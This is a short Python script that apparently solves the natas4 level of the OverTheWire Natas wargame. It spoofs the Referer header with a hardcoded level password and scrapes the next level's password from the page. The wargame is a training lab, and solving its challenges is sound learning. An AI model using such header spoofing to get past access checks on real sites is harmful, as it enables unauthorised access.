
#!/usr/bin/env python

import requests
import re

username = 'natas4'
password = 'QryZXc2e0zahULdHrtHxzyYkj59kUxLQ'

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = 'http://%s.natas.labs.overthewire.org/' % username

try:
    response = requests.get(url, auth=(username, password), headers=headers)
    content = response.text

    # Uncomment the line below to print the entire content of the response
    # print(content)

    # Using regular expression to find the password for natas5
    matches = re.findall(r'The password for natas5 is (.*)', content)

    if matches:
        password_natas5 = matches[0].strip()  # Strip any leading or trailing whitespace
        print("Password for natas5:", password_natas5)
    else:
        print("Password for natas5 not found in the response.")
except requests.exceptions.RequestException as e:
    print("An error occurred:", e)
